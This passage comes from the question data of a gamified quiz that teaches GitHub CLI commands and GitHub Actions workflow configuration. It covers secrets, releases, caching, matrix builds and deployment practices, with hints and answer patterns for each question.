          hintPartial: 'gh secret set API_KEY --____=abc123',
          hintFull: 'gh secret set API_KEY --body=abc123',
          acceptablePatterns: [],
          optimalPatterns: [/^gh\s+secret\s+set\s+API_KEY\s+--body=abc123$/i],
          baseCmds: ['gh']
        },
        {
          mode: 'terminal',
          prompt: 'A translucent ledger appears: <strong>"List every secret configured for this repository (names only, not values)."</strong>',
          damageIfCorrect: 14, damageIfOptimal: 22, timeAllotted: 45,
          hintNudge: 'gh secret, with a list action.',
          hintPartial: 'gh secret ____',
          hintFull: 'gh secret list',
          acceptablePatterns: [],
          optimalPatterns: [/^gh\s+secret\s+list$/i],
          baseCmds: ['gh']
        },
        {
          mode: 'terminal',
          prompt: 'The Phantom deletes a stale ward: <strong>"Remove the repository secret called <code>OLD_KEY</code>."</strong>',
          damageIfCorrect: 16, damageIfOptimal: 26, timeAllotted: 45,
          hintNudge: 'gh secret, with a delete action and the name.',
          hintPartial: 'gh secret ______ OLD_KEY',
          hintFull: 'gh secret delete OLD_KEY',
          acceptablePatterns: [],
          optimalPatterns: [/^gh\s+secret\s+delete\s+OLD_KEY$/i],
          baseCmds: ['gh']
        },
        {
          mode: 'terminal',
          prompt: 'A drifting variable takes shape: <strong>"Set a (non-secret) repository variable called <code>ENVIRONMENT</code> to <code>staging</code>."</strong>',
          damageIfCorrect: 16, damageIfOptimal: 26, timeAllotted: 45,
          hintNudge: 'gh has a separate command family for plain (non-secret) variables.',
          hintPartial: 'gh variable ___ ENVIRONMENT --____=staging',
          hintFull: 'gh variable set ENVIRONMENT --body=staging',
          acceptablePatterns: [],
          optimalPatterns: [/^gh\s+variable\s+set\s+ENVIRONMENT\s+--body=staging$/i],
          baseCmds: ['gh']
        },
        {
          mode: 'terminal',
          prompt: 'The Phantom checks its own limits: <strong>"Check your current GitHub API rate limit status."</strong>',
          damageIfCorrect: 16, damageIfOptimal: 26, timeAllotted: 45,
          hintNudge: 'gh api, pointed directly at the rate_limit endpoint.',
          hintPartial: 'gh api rate_____',
          hintFull: 'gh api rate_limit',
          acceptablePatterns: [],
          optimalPatterns: [/^gh\s+api\s+rate_limit$/i],
          baseCmds: ['gh']
        },
        {
          mode: 'terminal',
          prompt: 'It reaches for a named parcel: <strong>"Download the artifact named <code>build-output</code> specifically, from the most recent run."</strong>',
          damageIfCorrect: 18, damageIfOptimal: 28, timeAllotted: 45,
          hintNudge: 'gh run download, with a name flag to target one specific artifact.',
          hintPartial: 'gh run download -_ build-output',
          hintFull: 'gh run download -n build-output',
          acceptablePatterns: [],
          optimalPatterns: [/^gh\s+run\s+download\s+-n\s+build-output$/i],
          baseCmds: ['gh']
        },
        {
          mode: 'terminal',
          prompt: 'The Phantom restores a dormant path: <strong>"Re-enable the previously disabled workflow <code>nightly.yml</code>."</strong>',
          damageIfCorrect: 16, damageIfOptimal: 26, timeAllotted: 45,
          hintNudge: 'The counterpart to disable.',
          hintPartial: 'gh workflow ______ nightly.yml',
          hintFull: 'gh workflow enable nightly.yml',
          acceptablePatterns: [],
          optimalPatterns: [/^gh\s+workflow\s+enable\s+nightly\.yml$/i],
          baseCmds: ['gh']
        },
        {
          mode: 'terminal',
          prompt: 'A shifting form checks its own reflection: <strong>"View the raw YAML content of the workflow file <code>ci.yml</code>."</strong>',
          damageIfCorrect: 16, damageIfOptimal: 26, timeAllotted: 45,
          hintNudge: 'gh workflow, with a view action and a raw-output flag.',
          hintPartial: 'gh workflow view ci.yml --____',
          hintFull: 'gh workflow view ci.yml --yaml',
          acceptablePatterns: [/^gh\s+workflow\s+view\s+ci\.yml$/i],
          optimalPatterns: [/^gh\s+workflow\s+view\s+ci\.yml\s+--yaml$/i],
          baseCmds: ['gh']
        },
        {
          mode: 'spot_the_bug',
          prompt: 'The Phantom shows a flickering scroll: <strong>"This deploy step is supposed to only run on the main branch, but it runs on every branch. Find and fix the bug."</strong>',
          damageIfCorrect: 20, damageIfOptimal: 32, timeAllotted: 45,
          hintNudge: 'There\'s no conditional at all guarding this step — without an "if:" check, every step in a triggered job runs unconditionally.',
          hintPartial: 'There\'s no if: condition on this step at all — add one checking the branch before deploying.',
          hintFull: 'Add to the step: if: github.ref == \'refs/heads/main\'',
          codeBlock: [
            '- name: Deploy',
            '  run: ./deploy.sh'
          ],
          buggyLineId: 0,
          correctFixPatterns: [/if:\s*github\.ref\s*==\s*'refs\/heads\/main'/i]
        },
        {
          mode: 'spot_the_bug',
          prompt: 'A flickering page turns itself: <strong>"This matrix build is supposed to test 3 Node versions, but only ever runs once. Find and fix the bug."</strong>',
          damageIfCorrect: 20, damageIfOptimal: 32, timeAllotted: 45,
          hintNudge: 'A matrix strategy needs its values under "matrix:" — check whether it\'s structured correctly or just sitting as a flat list.',
          hintPartial: 'Line 2 lists versions as a flat array under "strategy:" directly — matrix values need to be nested under matrix: with a named key (e.g. node-version) the job can reference.',
          hintFull: 'Lines 2-3 should read: strategy:\\n  matrix:\\n    node-version: [16, 18, 20]',
          codeBlock: [
            'strategy:',
            '  [16, 18, 20]'
          ],
          buggyLineId: 1,
          correctFixPatterns: [/matrix:\s*\n?\s*node-version:\s*\[16,\s*18,\s*20\]/i]
        },
        {
          mode: 'spot_the_bug',
          prompt: 'The Phantom\'s form distorts: <strong>"Caching is set up, but the cache never actually invalidates, even after dependencies change. Find and fix the bug."</strong>',
          damageIfCorrect: 20, damageIfOptimal: 32, timeAllotted: 45,
          hintNudge: 'A cache key that never changes can never signal "this cache is stale" — it needs to be tied to something that DOES change when dependencies do, like a hash of the lockfile.',
          hintPartial: 'Line 2\'s key is a fixed string "npm-cache" that never changes — tie it to a hash of the lockfile so a real dependency change produces a genuinely new cache key.',
          hintFull: 'Line 2 should read: key: npm-${{ hashFiles(\'package-lock.json\') }}',
          codeBlock: [
            '- uses: actions/cache@v4',
            '  with:',
            '    key: npm-cache'
          ],
          buggyLineId: 2,
          correctFixPatterns: [/key:\s*npm-\$\{\{\s*hashFiles\('package-lock\.json'\)\s*\}\}/i]
        },
        {
          mode: 'spot_the_bug',
          prompt: 'A ghostly line refuses to align: <strong>"This step tries to reference a secret, but it always comes through as literally the text \'secrets.API_KEY\'. Find and fix the bug."</strong>',
          damageIfCorrect: 20, damageIfOptimal: 32, timeAllotted: 45,
          hintNudge: 'Referencing any workflow context value (secrets, env, github, etc.) needs the double-curly-brace expression syntax — a bare reference is just treated as a literal string.',
          hintPartial: 'Line 2 is missing the ${{ }} expression syntax entirely — without it, "secrets.API_KEY" is just a plain string, not an actual reference to the secret.',
          hintFull: 'Line 2 should read: API_KEY: ${{ secrets.API_KEY }}',
          codeBlock: [
            'env:',
            '  API_KEY: secrets.API_KEY'
          ],
          buggyLineId: 1,
          correctFixPatterns: [/API_KEY:\s*\$\{\{\s*secrets\.API_KEY\s*\}\}/i]
        },
        {
          mode: 'spot_the_bug',
          prompt: 'The Phantom flickers between two states: <strong>"An uploaded artifact can\'t be found by the downstream job that needs it. Find and fix the bug."</strong>',
          damageIfCorrect: 20, damageIfOptimal: 32, timeAllotted: 45,
          hintNudge: 'The upload step and the download step have to reference the SAME artifact name — check whether they actually match.',
          hintPartial: 'The upload step names the artifact "dist-files", but the download step in the other job asks for "build-output" — these names have to match exactly.',
          hintFull: 'The download step should read: - uses: actions/download-artifact@v4\\n  with:\\n    name: dist-files',
          codeBlock: [
            '(upload job): - uses: actions/upload-artifact@v4\n  with:\n    name: dist-files\n\n(download job): - uses: actions/download-artifact@v4\n  with:\n    name: build-output'
          ],
          buggyLineId: 0,
          correctFixPatterns: [/name:\s*dist-files/i]
        },
        {
          mode: 'spot_the_bug',
          prompt: 'A distorted echo repeats a name wrong: <strong>"A job that\'s supposed to only run when tests pass runs even when they fail. Find and fix the bug."</strong>',
          damageIfCorrect: 20, damageIfOptimal: 32, timeAllotted: 45,
          hintNudge: 'A "needs:" dependency alone only controls ORDER, not whether the job runs after a failure — by default, a dependent job is actually SKIPPED if its dependency fails, so check whether something is overriding that default.',
          hintPartial: 'Line 3\'s if: always() explicitly forces this job to run regardless of the test job\'s outcome — remove it (or replace with a success-only check) so the default skip-on-failure behavior applies.',
          hintFull: 'Line 3 should be removed, or read: if: success()',
          codeBlock: [
            'deploy:',
            '  needs: test',
            '  if: always()'
          ],
          buggyLineId: 2,
          correctFixPatterns: [/if:\s*success\(\)/i, /remove/i]
        },
        {
          mode: 'triage_call',
          prompt: 'The Phantom tilts its head: <strong>"Deciding between a matrix build vs. a single job with a manual loop, to test across 3 Node versions. Pick your move, then justify it in one line."</strong>',
          damageIfCorrect: 20, damageIfOptimal: 34, timeAllotted: 45,
          hintNudge: 'A matrix runs each combination as a genuinely separate, parallel job with its own clear pass/fail status. A manual loop inside one job runs everything sequentially in one combined result.',
          hintPartial: 'A matrix build runs each version in parallel with its own distinct result, making it immediately clear which SPECIFIC version failed — a manual loop just gives one combined pass/fail for the whole job.',
          hintFull: 'Best: a matrix build — parallel execution (faster overall) and a clear, separate result per version, versus a manual loop which runs sequentially and obscures exactly which version actually failed.',
          options: [
            { id: 'a', label: 'A single job with a manual shell loop over the 3 versions', tier: 'wrong', why: 'Runs sequentially (slower overall) and gives one combined result — if it fails, you can\'t immediately tell which of the 3 versions was the actual problem without digging into the log.' },
            { id: 'b', label: 'A matrix build', tier: 'best', why: 'Runs all 3 versions in parallel (faster) with a distinct, clear pass/fail result per version — exactly the built-in feature for "run the same job across several variants."' },
            { id: 'c', label: 'Three completely separate, manually duplicated workflow files', tier: 'wrong', why: 'Triples the maintenance burden — any change to the job now has to be made in 3 places instead of using the matrix feature built specifically to avoid that duplication.' }
          ],
          justificationPatterns: [/matrix|parallel|clear.*result|separate\s*(status|result)/i]
        },
        {
          mode: 'triage_call',
          prompt: 'A translucent hand weighs two paths: <strong>"Deciding whether to use the built-in GITHUB_TOKEN or a separate Personal Access Token (PAT) for a workflow step. Pick your move, then justify it in one line."</strong>',
          damageIfCorrect: 20, damageIfOptimal: 34, timeAllotted: 45,
          hintNudge: 'GITHUB_TOKEN is automatically scoped to just the current repository and expires after the job — a PAT typically has broader, longer-lived access unless carefully scoped.',
          hintPartial: 'Use GITHUB_TOKEN whenever it has enough permission for the task — it\'s automatically scoped and short-lived, which is strictly safer than a broader, longer-lived PAT for anything it can already do.',
          hintFull: 'Best: use the built-in GITHUB_TOKEN whenever its permissions are sufficient — it\'s automatically scoped to just this repo and expires when the job ends; reach for a PAT only when a task genuinely needs something GITHUB_TOKEN can\'t do (e.g. triggering another workflow, cross-repo access).',
          options: [
            { id: 'a', label: 'Always use a PAT, for consistency across all workflows', tier: 'wrong', why: 'PATs are typically broader-scoped and longer-lived than necessary — using one by default when GITHUB_TOKEN would suffice is unnecessary exposure for zero real benefit.' },
            { id: 'b', label: 'Use GITHUB_TOKEN by default, a PAT only when a specific need requires it', tier: 'best', why: 'GITHUB_TOKEN\'s automatic scoping and short lifetime make it strictly safer for anything it can already do — reserving a PAT for genuine gaps (like triggering other workflows) minimizes unnecessary exposure.' },
            { id: 'c', label: 'Avoid both — hardcode a service account\'s credentials directly', tier: 'wrong', why: 'Trades a purpose-built, auto-rotating, scoped token mechanism for a manually-managed static credential — objectively worse on every axis (rotation, scope, exposure risk).' }
          ],
          justificationPatterns: [/github_token|automatically\s*scoped|short.?lived|sufficient/i]
        },
        {
          mode: 'triage_call',
          prompt: 'The Phantom drifts between two doors: <strong>"Deciding whether slow end-to-end tests should run on every PR, or only nightly. Pick your move, then justify it in one line."</strong>',
          damageIfCorrect: 20, damageIfOptimal: 34, timeAllotted: 45,
          hintNudge: 'Slow E2E tests on every PR add real friction/wait time to every single contributor\'s workflow — the real question is whether that cost is worth the earlier feedback for THIS specific test suite\'s value.',
          hintPartial: 'Running truly slow E2E tests on every PR adds real friction to every contributor\'s day; a nightly run still catches regressions reasonably promptly without that per-PR tax — a common, reasonable middle ground.',
          hintFull: 'Best (as a common default): run fast checks (lint, unit tests) on every PR for immediate feedback, and reserve the SLOW E2E suite for nightly (or on-demand) — this still catches regressions without adding real, repeated friction to every single PR.',
          options: [
            { id: 'a', label: 'Run the full slow E2E suite on every single PR', tier: 'defensible', why: 'Maximizes safety per PR, but adds real, repeated wait time to every contributor\'s workflow — for a genuinely slow suite, that\'s a real ongoing cost worth weighing against nightly\'s "slightly delayed" feedback.' },
            { id: 'b', label: 'Run fast checks on every PR, reserve the slow E2E suite for nightly', tier: 'best', why: 'Keeps per-PR feedback fast for contributors while still catching regressions reasonably promptly via the nightly run — a common, practical balance for genuinely slow test suites.' },
            { id: 'c', label: 'Never run E2E tests in an automated pipeline at all', tier: 'wrong', why: 'Throws away real regression-catching value entirely — the actual tradeoff is WHEN to run slow tests, not whether to run them at all.' }
          ],
          justificationPatterns: [/nightly|fast\s*(checks|feedback)|friction|reserve.*slow/i]
        },
        {
          mode: 'triage_call',
          prompt: 'A slab grinds within the stage: <strong>"A deploy job depends on a test job passing. Deciding what happens when the test job fails. Pick your move, then justify it in one line."</strong>',
          damageIfCorrect: 20, damageIfOptimal: 34, timeAllotted: 45,
          hintNudge: 'By default, GitHub Actions already skips a dependent job when its dependency fails — the real question is whether to keep that safe default or explicitly override it.',
          hintPartial: 'Keep the default skip-on-failure behavior for a deploy job — deploying code that failed its own tests is exactly the scenario this default protects against.',
          hintFull: 'Best: rely on the default behavior (a job is skipped if its "needs:" dependency fails) rather than adding if: always() or similar — explicitly forcing deploy to run regardless of test outcome defeats the entire point of gating deploy on tests passing.',
          options: [
            { id: 'a', label: 'Add if: always() to the deploy job so it always attempts to run', tier: 'wrong', why: 'Defeats the entire purpose of gating deploy on tests passing — this explicitly forces a deploy to happen even when the tests it depends on failed.' },
            { id: 'b', label: 'Leave the default behavior in place (deploy is automatically skipped if test fails)', tier: 'best', why: 'The safe, sensible default — deploying code that just failed its own test suite is exactly the outcome this default protects against, with zero extra configuration needed.' },
            { id: 'c', label: 'Remove the needs: dependency entirely so deploy runs independently', tier: 'wrong', why: 'Removes the ordering AND the safety gate together — deploy could now run in parallel with (or even before) tests finish, with no relationship to their outcome at all.' }
          ],
          justificationPatterns: [/default\s*behavior|skip(ped)?\s*(on\s*)?failure|gate.*deploy/i]
        },
        {
          mode: 'read_the_room',
          prompt: 'A translucent shape flickers with error. <strong>Dependency installation takes the full, uncached time on every single run, despite a cache step being present. Diagnose it, then fix it.</strong>',
          damageIfCorrect: 22, damageIfOptimal: 36, timeAllotted: 45,
          hintNudge: 'Check exactly what the cache key is built from — if it never actually changes (or is wrong in some other way), the cache technically "exists" but never meaningfully helps or is never found as a hit.',
          hintPartial: 'The cache key references a file path that doesn\'t actually exist in this repo (a typo\'d lockfile filename) — hashFiles() on a non-existent path produces an empty/inconsistent hash, so the cache never reliably hits.',
          hintFull: 'Diagnosis: the cache key references the wrong/misspelled lockfile path, so hashFiles() can\'t produce a consistent, real hash. Fix: correct the file path in the cache key to the project\'s actual lockfile.',
          outputBlock: [
            '$ (workflow file)',
            'key: npm-${{ hashFiles(\'packages-lock.json\') }}',
            '',
            '(actual lockfile in the repo is named: package-lock.json)'
          ],
          acceptableDiagnosesPatterns: [/wrong\s*(file\s*)?path/i, /typo.*lockfile/i, /hashFiles.*wrong/i],
          followUpFix: {
            prompt: 'Fix the cache key to reference the actual lockfile:',
            acceptablePatterns: [],
            optimalPatterns: [/hashFiles\('package-lock\.json'\)/i]
          }
        },
        {
          mode: 'read_the_room',
          prompt: 'The Phantom flickers between two worlds. <strong>A matrix build passes on Ubuntu and macOS but fails only on the Windows runner. Diagnose it, then fix it.</strong>',
          damageIfCorrect: 22, damageIfOptimal: 36, timeAllotted: 45,
          hintNudge: 'Check the actual error for something OS-specific — a very common one is a hardcoded path using the wrong slash direction for that operating system.',
          hintPartial: 'The build script uses a forward-slash path hardcoded, but Windows\'s shell/tools in this context expect backslashes (or the script should use a cross-platform path-joining approach instead of hardcoding either).',
          hintFull: 'Diagnosis: a hardcoded, OS-specific path separator breaks on Windows. Fix: use a cross-platform path approach (e.g. the language\'s own path-join utility) instead of hardcoding forward or back slashes.',
          outputBlock: [
            '$ (Windows runner log)',
            'Error: Cannot find module \'.\\src/utils\'',
            '',
            '(same step passes fine on ubuntu-latest and macos-latest)'
          ],
          acceptableDiagnosesPatterns: [/path\s*separator/i, /windows.*(path|slash)/i, /os.?specific\s*path/i],
          followUpFix: {
            prompt: 'Fix it using a cross-platform path approach instead of a hardcoded separator:',
            acceptablePatterns: [],
            optimalPatterns: [/path\.join|cross.?platform/i]
          }
        },
        {
          mode: 'read_the_room',
          prompt: 'A hollow silence answers a request. <strong>A workflow triggered by pushes to a specific branch simply never runs, with no error at all. Diagnose it, then fix it.</strong>',
          damageIfCorrect: 22, damageIfOptimal: 36, timeAllotted: 45,
          hintNudge: 'Check the exact branch name/pattern in the trigger config against the actual branch being pushed to — a mismatch means the trigger simply never fires, silently, with no error to see.',
          hintPartial: 'The trigger is configured for branch "develop", but the team actually pushes to a branch called "dev" — since these don\'t match, the workflow correctly (and silently) never fires; there\'s no error because nothing is technically wrong syntactically.',
          hintFull: 'Diagnosis: the trigger\'s branch filter doesn\'t match the actual branch name being used. Fix: correct the branch name in the "on: push: branches:" config to match reality.',
          outputBlock: [
            '$ (workflow file)',
            'on:\\n  push:\\n    branches: [develop]',
            '',
            '$ git branch',
            '* dev'
          ],
          acceptableDiagnosesPatterns: [/branch\s*(name\s*)?mismatch/i, /wrong\s*branch\s*(name|filter)/i, /doesn'?t\s*match/i],
          followUpFix: {
            prompt: 'Fix the trigger to match the actual branch name:',
            acceptablePatterns: [],
            optimalPatterns: [/branches:\s*\[dev\]/i]
          }
        },
        {
          mode: 'read_the_room',
          prompt: 'A wisp reaches for something that was never handed over. <strong>A downstream job references another job\'s output, but it always comes through completely empty. Diagnose it, then fix it.</strong>',
          damageIfCorrect: 22, damageIfOptimal: 36, timeAllotted: 45,
          hintNudge: 'For a step\'s value to be usable as a job output, the step itself needs an "id:", and the job needs an explicit "outputs:" mapping pointing at it — check whether both pieces are actually present.',
          hintPartial: 'The producing job never declares an outputs: block at all — even though the step itself sets a value, nothing exposes it as an actual job-level output for other jobs to reference.',
          hintFull: 'Diagnosis: the producing job never declares an outputs: block, so nothing is exposed at the job level. Fix: add outputs: mapping the step\'s value, e.g. version: ${{ steps.get-version.outputs.version }}.',
          outputBlock: [
            '$ (workflow file, producing job)',
            'build:',
            '  steps:',
            '    - id: get-version',
            '      run: echo "version=1.2.3" >> $GITHUB_OUTPUT',
            '(no outputs: block on the job itself)',
            '',
            '$ (downstream job) echo ${{ needs.build.outputs.version }}',
            '(prints nothing)'
          ],
          acceptableDiagnosesPatterns: [/no\s*outputs?\s*block/i, /missing\s*outputs?/i, /never\s*declares?\s*outputs?/i],
          followUpFix: {
            prompt: 'Fix it by adding the missing outputs mapping to the producing job:',
            acceptablePatterns: [],
            optimalPatterns: [/outputs:/i]
          }
        },
        {
          mode: 'read_the_room',
          prompt: 'A recurring haunting never arrives on schedule. <strong>A scheduled (cron) workflow never seems to run at the expected time. Diagnose it, then fix it.</strong>',
          damageIfCorrect: 22, damageIfOptimal: 36, timeAllotted: 45,
          hintNudge: 'Cron syntax has 5 fields in a specific order — a value in the wrong field position can make the schedule simply never match the intended real time.',
          hintPartial: 'The workflow file\'s cron expression has the minute and hour fields swapped — it\'s scheduled for 9 minutes past midnight, not 9am.',
          hintFull: 'Diagnosis: the cron expression\'s fields are in the wrong order (minute and hour swapped). Fix: correct it to \'0 9 * * 1-5\' for 9am on weekdays.',
          outputBlock: [
            '$ (workflow file)',
            'on:',
            '  schedule:',
            '    - cron: \'9 0 * * 1-5\'',
            '',
            '(team expected this to run at 9am on weekdays; it actually runs at 12:09am)'
          ],
          acceptableDiagnosesPatterns: [/fields?\s*(swapped|wrong\s*order)/i, /minute\s*and\s*hour/i, /wrong\s*(cron\s*)?(field|order)/i],
          followUpFix: {
            prompt: 'Fix the cron expression to actually run at 9am on weekdays:',
            acceptablePatterns: [],
            optimalPatterns: [/cron:\s*'0\s+9\s+\*\s+\*\s+1-5'/i]
          }
        },
        {
          mode: 'build_the_pipeline',
          prompt: 'The Phantom flickers into a familiar shape. <strong>Sequence the correct order for setting up dependency caching properly.</strong>',
          steps: [
            'Identify the dependency lockfile to key the cache on',
            'Add a cache step keyed on a hash of that lockfile',
            'Restore the cache before the install step',
            'Confirm a cache hit actually skips the slow install on the next run'
          ],
          damageIfCorrect: 24, damageIfOptimal: 40,
          damageToHeroIfWrong: 22
        },
        {
          mode: 'build_the_pipeline',
          prompt: 'A pale shape steadies itself. <strong>Sequence the correct order for a multi-job pipeline that builds an artifact in one job and deploys it in another.</strong>',
          steps: [
            'Build job: check out code, build, upload the artifact',
            'Deploy job: needs: build (to wait for it)',
            'Deploy job: download the artifact',
            'Deploy job: deploy using the downloaded artifact'
          ],
          damageIfCorrect: 24, damageIfOptimal: 40,
          damageToHeroIfWrong: 22
        }
      ]
    },
    {
      name: 'Level 3 — Advanced Basics',
      hp: 150,
      questions: [
        {
          mode: 'terminal',
          prompt: 'The Phantom marks a new milestone: <strong>"Create a new GitHub release for tag <code>v2.0.0</code>."</strong>',
          damageIfCorrect: 18, damageIfOptimal: 28, timeAllotted: 40,
          hintNudge: 'gh release, with a create action and the tag.',
          hintPartial: 'gh release ______ v2.0.0',
          hintFull: 'gh release create v2.0.0',
          acceptablePatterns: [],
          optimalPatterns: [/^gh\s+release\s+create\s+v2\.0\.0$/i],
          baseCmds: ['gh']
        },
        {
          mode: 'terminal',
          prompt: 'A translucent archive unfolds: <strong>"List every release published for this repository."</strong>',
          damageIfCorrect: 14, damageIfOptimal: 22, timeAllotted: 40,
          hintNudge: 'gh release, with a list action.',
          hintPartial: 'gh release ____',
          hintFull: 'gh release list',
          acceptablePatterns: [],
          optimalPatterns: [/^gh\s+release\s+list$/i],
          baseCmds: ['gh']
        },
        {
          mode: 'terminal',
          prompt: 'The Phantom summons a check register: <strong>"Show the status of all required checks on pull request #42."</strong>',
          damageIfCorrect: 16, damageIfOptimal: 26, timeAllotted: 40,
          hintNudge: 'gh pr, with a checks action and the PR number.',
          hintPartial: 'gh pr ______ 42',
          hintFull: 'gh pr checks 42',
          acceptablePatterns: [],
          optimalPatterns: [/^gh\s+pr\s+checks\s+42$/i],
          baseCmds: ['gh']
        },
        {
          mode: 'terminal',
          prompt: 'It manifests configuration for a specific realm: <strong>"View the deployment environments configured for this repository, via the API."</strong>',
          damageIfCorrect: 18, damageIfOptimal: 28, timeAllotted: 40,
          hintNudge: 'gh api, pointed at the repo\'s environments endpoint.',
          hintPartial: 'gh api repos/{owner}/{repo}/____________',
          hintFull: 'gh api repos/{owner}/{repo}/environments',
          acceptablePatterns: [],
          optimalPatterns: [/^gh\s+api\s+repos\/\{owner\}\/\{repo\}\/environments$/i],
          baseCmds: ['gh']
        },
        {
          mode: 'terminal',
          prompt: 'The Phantom invokes a named ritual with custom words: <strong>"Trigger the workflow <code>deploy.yml</code>, passing an input field <code>environment</code> set to <code>staging</code>."</strong>',
          damageIfCorrect: 20, damageIfOptimal: 32, timeAllotted: 40,
          hintNudge: 'gh workflow run, with a field flag for a workflow_dispatch input.',
          hintPartial: 'gh workflow run deploy.yml -_ environment=staging',
          hintFull: 'gh workflow run deploy.yml -f environment=staging',
          acceptablePatterns: [],
          optimalPatterns: [/^gh\s+workflow\s+run\s+deploy\.yml\s+-f\s+environment=staging$/i],
          baseCmds: ['gh']
        },
        {
          mode: 'terminal',
          prompt: 'A translucent ledger checks a single moment: <strong>"Check whether the specific commit <code>a1b2c3d</code> has passing status checks, via the API."</strong>',
          damageIfCorrect: 18, damageIfOptimal: 28, timeAllotted: 40,
          hintNudge: 'gh api, pointed at that commit\'s status endpoint.',
          hintPartial: 'gh api repos/{owner}/{repo}/commits/a1b2c3d/______',
          hintFull: 'gh api repos/{owner}/{repo}/commits/a1b2c3d/status',
          acceptablePatterns: [],
          optimalPatterns: [/^gh\s+api\s+repos\/\{owner\}\/\{repo\}\/commits\/a1b2c3d\/status$/i],
          baseCmds: ['gh']
        },
        {
          mode: 'spot_the_bug',
          prompt: 'The Phantom shows a flickering scroll: <strong>"This reusable workflow call fails — a required input is missing. Find and fix the bug."</strong>',
          damageIfCorrect: 22, damageIfOptimal: 36, timeAllotted: 40,
          hintNudge: 'A reusable workflow declares which inputs are required — check the caller against what the reusable workflow itself actually demands.',
          hintPartial: 'The caller is missing the "environment" input entirely, which the reusable workflow marks as required — add it under "with:".',
          hintFull: 'Add under with: environment: production',
          codeBlock: [
            'jobs:',
            '  call-deploy:',
            '    uses: ./.github/workflows/deploy-reusable.yml'
          ],
          buggyLineId: 2,
          correctFixPatterns: [/with:\s*\n?\s*environment:/i]
        },
        {
          mode: 'spot_the_bug',
          prompt: 'A flickering page turns itself: <strong>"Two deploys to the same environment run at the same time and step on each other. Find and fix the bug."</strong>',
          damageIfCorrect: 22, damageIfOptimal: 36, timeAllotted: 40,
          hintNudge: 'A concurrency setting is what prevents overlapping runs of the same workflow/environment — check whether it\'s configured at all.',
          hintPartial: 'There\'s no concurrency group configured for this deploy job at all — add one keyed by environment so overlapping deploys queue instead of racing.',
          hintFull: 'Add to the job: concurrency:\\n  group: deploy-production\\n  cancel-in-progress: false',
          codeBlock: [
            'deploy:',
            '  runs-on: ubuntu-latest'
          ],
          buggyLineId: 0,
          correctFixPatterns: [/concurrency:/i]
        },
        {
          mode: 'spot_the_bug',
          prompt: 'The Phantom\'s form distorts: <strong>"A semantic-version release trigger is supposed to match tags like v1.2.3, but it never fires. Find and fix the bug."</strong>',
          damageIfCorrect: 22, damageIfOptimal: 36, timeAllotted: 40,
          hintNudge: 'Tag-matching patterns in GitHub Actions use a glob-like syntax — check whether the pattern actually matches a real version tag\'s shape.',
          hintPartial: 'Line 2\'s pattern "v*" would actually match "v1.2.3" fine — look again: it\'s missing the tags: key entirely, sitting directly under push with no nesting.',
          hintFull: 'Line 2 should read: tags: [\'v*\']',
          codeBlock: [
            'on:',
            '  push:',
            '    \'v*\''
          ],
          buggyLineId: 2,
          correctFixPatterns: [/tags:\s*\[\s*'v\*'\s*\]/i]
        },
        {
          mode: 'spot_the_bug',
          prompt: 'A ghostly line refuses to align: <strong>"A production environment is supposed to require manual approval, but deploys go through automatically. Find and fix the bug."</strong>',
          damageIfCorrect: 22, damageIfOptimal: 36, timeAllotted: 40,
          hintNudge: 'The environment PROTECTION RULE (required reviewers) is configured on the GitHub environment itself, in repo settings — not something that can be declared purely inline in the workflow YAML.',
          hintPartial: 'The workflow correctly references the "production" environment, but that environment has never actually had a required-reviewers protection rule configured in the repository\'s settings.',
          hintFull: 'Fix (outside the YAML): go to Settings → Environments → production, and add required reviewers under protection rules.',
          codeBlock: [
            'deploy:',
            '  environment: production'
          ],
          buggyLineId: 1,
          correctFixPatterns: [/required\s*reviewers|protection\s*rule/i]
        },
        {
          mode: 'spot_the_bug',
          prompt: 'The Phantom flickers between two states: <strong>"A reusable workflow\'s secrets aren\'t available to it, even though the caller has them. Find and fix the bug."</strong>',
          damageIfCorrect: 22, damageIfOptimal: 36, timeAllotted: 40,
          hintNudge: 'Reusable workflow calls don\'t automatically inherit the caller\'s secrets — an explicit "secrets:" section (or the "inherit" shortcut) is needed.',
          hintPartial: 'The caller never passes any secrets to the reusable workflow at all — add a secrets: block (or the "inherit" shortcut) so the reusable workflow actually receives them.',
          hintFull: 'Add under the call: secrets: inherit',
          codeBlock: [
            'call-deploy:',
            '  uses: ./.github/workflows/deploy-reusable.yml',
            '  with:',
            '    environment: production'
          ],
          buggyLineId: 3,
          correctFixPatterns: [/secrets:\s*inherit/i]
        },
        {
          mode: 'triage_call',
          prompt: 'The Phantom tilts its head: <strong>"Choosing a deployment strategy for a critical, high-traffic service where minimizing blast radius from a bad deploy matters most. Pick your move, then justify it in one line."</strong>',
          damageIfCorrect: 22, damageIfOptimal: 38, timeAllotted: 40,
          hintNudge: 'One strategy shifts ALL traffic at once. One gradually shifts a small percentage of traffic first, watching real metrics before continuing — directly limiting how many real users a bad deploy actually affects.',
          hintPartial: 'Canary deployment gradually exposes a bad deploy to only a small slice of real traffic first, catching problems before they affect everyone — directly minimizing blast radius, which is exactly the stated priority.',
          hintFull: 'Best: canary deployment — gradually shifts a small percentage of real traffic to the new version, watching metrics before continuing, so a bad deploy affects only a fraction of users instead of everyone at once.',
          options: [
            { id: 'a', label: 'Rolling deployment (replace instances gradually, no traffic-based gating)', tier: 'defensible', why: 'Reduces some risk versus an all-at-once deploy, but still doesn\'t gate on real traffic/metrics the way canary does — a bad version can still reach a meaningful share of instances before anyone notices.' },
            { id: 'b', label: 'Canary deployment', tier: 'best', why: 'Directly minimizes blast radius by exposing a bad deploy to only a small percentage of real traffic first, with a real metrics-based gate before it goes any further — exactly matching the stated priority.' },
            { id: 'c', label: 'Blue-green deployment (instant full cutover)', tier: 'defensible', why: 'Gives instant, complete rollback if something\'s wrong, but a bad deploy still hits 100% of traffic the moment it cuts over — canary\'s gradual, metrics-gated exposure more directly minimizes blast radius.' }
          ],
          justificationPatterns: [/canary|gradual|small\s*(percentage|slice)|blast\s*radius/i]
        },
        {
          mode: 'triage_call',
          prompt: 'A translucent hand weighs two paths: <strong>"Deciding whether production deploys need a manual approval gate. Pick your move, then justify it in one line."</strong>',
          damageIfCorrect: 22, damageIfOptimal: 38, timeAllotted: 40,
          hintNudge: 'The right answer genuinely depends on how much confidence the team has in its automated safety net (tests, canary, automated rollback) — this isn\'t a universal yes/no.',
          hintPartial: 'If the pipeline has strong automated safeguards (thorough tests, canary analysis, automated rollback), full automation is reasonable; without that maturity, a manual gate is a real, valuable safety net worth the added friction.',
